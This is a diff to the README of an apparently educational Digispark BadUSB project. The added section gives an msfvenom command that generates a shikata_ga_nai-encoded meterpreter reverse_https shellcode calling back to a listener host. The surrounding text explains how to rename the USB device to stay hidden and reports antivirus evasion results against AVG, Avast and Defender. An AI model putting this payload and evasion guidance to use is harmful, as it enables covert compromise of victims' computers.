@@ -35,9 +35,17 @@ To flash the firmware, unzip the micronucleus folder, in a command prompt, enter
 Ater the bootloader is flashed, the delay should be removed. To program digispark after flashing to the new bootloader, bridge the GND and P0 pins on Digispark with a conductive wire when uploading new code.
 
 ## Hiding Digispark's name
-  When a USB device is first initialised, a notification will show up in windows with the name of the device, to change the name of Digispark to better hide the device, navigate to the Arduino config file ```libraries\DigisparkKeyboard\usbconfig.h```, the name can be changed accordinly.   
+ When a USB device is first initialised, a notification will show up in windows with the name of the device, to change the name of Digispark to better hide the device, navigate to the Arduino config file ```libraries\DigisparkKeyboard\usbconfig.h```, the name can be changed accordinly.   
 ![alt text](resources/digispark_namechange.png)   
 
+## Writing a custom payload
+Most antiviruses scans for known signatures to detect viruses/malwares, in order to sucessfully deliver the paylaod to the victim machine, the singature of the payload must not be in any antivirus databases, so a completely new custom payload will have to be created.
+
+First we can use msfvenom to generate a shellcode, this will be the basis where the custom payload will be built on. We chose to use reverse https encoded using the shikata_ga_nai encoder, this will make the shellcode harder to detect. 
+```
+msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.0.10 LPORT=443 HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" -e x86/shikata_ga_nai -i 8 -f c > shell.c
+```
+![alt text](resources/base_shellcode.png)  
 
 ## Antivirus evasion
 **AVG:**  AVG antivirus can be evaded as per the demo video.   
@@ -45,7 +53,7 @@ Ater the bootloader is flashed, the delay should be removed. To program digispar
 **Avast:**  Avast can be partially evaded, if webshield is turned off to allow downloading of local network files(Avast blocks downloading files local network by default, for this project, we hosted the files on the local network for easier access and management, however, if this is a real attack, the payload would be hosted on a remote server and the webshield would not block the download), with fast migration, the meterpreter shell stayed open for a few mimutes before being detected.   
 ![alt text](resources/avast_evasion.png)   
 
-  
+ 
 **Windows Defender:**  in some cases, we were able to evade it, although it is not consistent, most of the time the payload can be downloaded but a meterpreter session cannot be opened without being detected. 
 ![alt text](resources/wdefender_evasion.png)   
 
